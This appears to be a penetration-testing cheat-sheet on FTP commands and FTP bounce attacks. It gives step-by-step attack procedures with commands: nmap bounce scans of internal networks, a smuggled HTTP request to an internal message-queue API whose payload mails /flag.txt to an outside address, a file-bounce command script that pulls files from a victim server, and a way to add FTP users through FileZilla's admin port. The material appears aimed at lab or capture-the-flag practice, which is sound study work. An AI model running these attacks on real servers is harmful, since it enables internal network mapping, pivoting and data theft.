* Some FTP commands
	* USER username
	* PASS password
	* HELP The server indicates which commands are supported
	* PORT 127,0,0,1,0,80
		* This will indicate the FTP server to establish a connection with the IP 127.0.0.1 in port 80 (you need to put the 5th char as "0" and the 6th as the port in decimal or use the 5th and 6th to express the port in hex).
	* EPRT |2|127.0.0.1|80|This will indicate the FTP server to establish a TCP connection (indicated by "2") with the IP 127.0.0.1 in port 80. This command supports IPv6.
	* LIST
		* This will send the list of files in current folder
	* APPE /path/something.txt This will indicate the FTP to store the data received from a passive connection or from a PORT/EPRT connection to a file. If the filename exists, it will append the data.
	* STOR /path/something.txt Like APPE but it will overwrite the files
	* STOU /path/something.txt Like APPE, but if exists it won't do anything.
	* RETR /path/to/file A passive or a port connection must be establish. Then, the FTP server will send the indicated file through that connection
	* REST 6 This will indicate the server that next time it send something using RETR it should start in the 6th byte.
	* TYPE i Set transfer to binary
	* PASV This will open a passive connection and will indicate the user were he can connects

#### FTP Bounce
* <details><summary>References (Click to expand)</summary><p>
	* [https://www.rapid7.com/db/vulnerabilities/ftp-port-bounce/](https://www.rapid7.com/db/vulnerabilities/ftp-port-bounce/)
* <details><summary>Requirements (Click to expand)</summary><p>
	* `PORT` command is allowed
* Overview
	* FTP client can direct the FTP server to connect to arbitrarry IP/ports. This functionally allows an attacker to scan/map the network from the FTP.
* Process
	* Using "FTP"
		1. Connect to vulnerable FTP
		1. Enter **one** of the following to make it establish a connection with the `<IP:Port>` you want to scan:
			* `PORT`

					PORT 172,32,80,80,0,8080
			* `EPRT`

					EPRT |2|172.32.80.80|8080|
		1. Finale
			* Use `LIST` (this will just send to the connected `<IP:Port>` the list of current files in the FTP folder) and check for the possible responses: 150 File status okay (This means the port is open) or 425 No connection established (This means the port is closed)
			* RETR /file/in/ftp and look for similar Open/Close responses.
	* nmap
		* Basic FTP bounce format

				nmap -b <name>:<pass>@<ftp_server> <victim>
		* Scan ports 21,80 of the FTP

				nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1
		* Scan the internal network (of the FTP) ports 21,22,445,80,443

				nmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24

##### Perform HTTP request as vulnerable FTP server
* <details><summary>Requirements (Click to expand)</summary><p>
	* Vulnerable to FTP Bounce
* Process
	1. Upload the request (inside a text file) to the vulnerable server. Remember that if you want to talk with another HTTP or FTP server you need to change lines with 0x0d 0x0a
	1. Use `REST X` to avoid sending the characters you don't want to send (maybe to upload the request inside the file you needed to put some image header at the begging)
	1. Use `PORT` to connect to the arbitrary server and service
	1. Use `RETR` to send the saved request to the server.
* <details><summary>`Socket not writable` Troubleshooting Note (Click to expand)</summary><p>
	* Its highly probably that this will throw an error like Socket not writable because the connection doesn't last enough to send the data with RETR. Suggestions to try to avoid that are:
		* If you are sending an HTTP request, put the same request one after another until ~0.5MB at least. Like this:

				Â‰PNG
				POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
				Host: 172.32.56.72:15672

				<<<<<<<<<<<<<<<<<<<<<<<<TRUNCATED, ALL DUPLICATES>>>>>>>>>>>>>>>>

				{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},"routing_key":"email","delivery_mode":"1","payload":"{\"to\":\"xxxxxxxxxxx@gmail.com\",\"attachments\":[{\"path\":\"/flag.txt\"}]}","headers":{},"props":{},"payload_encoding":"string"}
		* Try to fill the request with "junk" data relative to the protocol (talking to FTP maybe just junk commands or repeating the RETRinstruction to get the file)
		* Just fill the request with a lot of null characters or others (divided on lines or not)

##### FTP File-Bounce

	* [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)
	* [https://book.hacktricks.xyz/pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file](https://book.hacktricks.xyz/pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file)
* <details><summary>Overview (Click to expand)</summary><p>
	* If you have access to a bounce FTP server, you can make it request files of other FTP server (where you know some credentials) and download that file to your own server.
* <details><summary>Requirements (Click to expand)</summary><p>
	* FTP valid credentials in the FTP Middle server
	* FTP valid credentials in Victim FTP server
	* Both server accepts the PORT command (bounce FTP attack)
	* You can write inside some directory of the FRP Middle server
	* The middle server will have more access inside the Victim FTP Server than you for some reason (this is what you are going to exploit) 
* Process
	1. Connect to your own FTP server and make the connection passive (`PASV` command) to make it listen in a directory where the victim service will send the file

			ftp username@<ftp_server>
			PASV
		* **Note** of the address and port that are returned from the PASV command (`F,F,F,F,X,X`)
		* The FTP session hang. Continue the process separately.
 	1. Construct a file (e.g, "instrs") containing FTP server commands.

		 	user ftp
			pass -anonymous@
			cwd /export-restricted-crypto
			type i
			port F,F,F,F,X,X
			retr crypto.tar.Z
			quit
			^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
			^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
		* `F,F,F,F,X,X` - The address/port (10,10,10,10,2,3) that your own machine handed you on the first connection. The trash at the end is extra lines you create, each containing 250 NULLS and nothing else, enough to fill up about 60K of extra data. The reason for this filler is explained later.
 	1. Open an FTP connection to `<SERVER>.<TLD>`, log in anonymously, and cd to /incoming. Now type the following into this FTP session, which transfers a copy of your "instrs" file over and then tells ufred.edu's FTP server to connect to crypto.com's FTP server using your file as the commands:

			put instrs
			port C,C,C,C,0,21
			retr instrs
	1. Make the file that is going to send the FTP Middle server to the Victim server (the exploit). This file will be a plaint text of the needed commands to authenticate against the Victim server, change the directory and download a file to your own server.
	1. Connect to the FTP Middle Server and upload de previous file
	1. Make the FTP Middle server establish a connection with the victim server and send the exploit file
	1. Capture the file in your own FTP server
	1. Delete the exploit file from the FTP Middle server


##### FileZilla
* FileZilla usually binds to local an Administrative service for the FileZilla-Server (port 14147). If you can create a tunnel from your machine to access this port, you can connect to it using a blank password and create a new user for the FTP service.
